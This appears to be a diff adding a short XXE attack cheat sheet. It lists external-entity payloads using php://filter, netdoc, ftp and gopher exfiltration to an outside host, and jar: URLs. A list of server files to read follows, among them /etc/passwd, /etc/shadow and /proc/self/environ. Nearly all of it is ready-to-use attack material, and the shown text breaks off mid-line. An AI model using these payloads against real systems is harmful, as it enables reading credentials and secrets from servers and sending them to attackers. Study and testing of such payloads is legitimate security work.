@@ -1,0 +1,21 @@
+<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=….php" >
+
+<!ENTITY file SYSTEM “netdoc://" > // alternative to file://
+
+<!ENTITY file SYSTEM "ftp://user:data@host" >
+
+<!ENTITY file SYSTEM "gopher://host/?data" >
+
+<!ENTITY file SYSTEM "jar:file://archive.zip!config.properties" >
+
+**************************************************************************
+Files to check
+
+▪ file:///etc/passwd
+▪ file:///etc/hosts
+▪ file:///etc/resolv.conf
+▪ file:///dev/urandom & file:///dev/zero (Time based detection)
+▪ file:///etc/shadow (Feeling lucky)
+▪ file:///proc/self/cwd/FILE
+▪ file:///proc/self/{net/dev, cmdline, environ}
+▪ file:///etc/lsb-release (safe
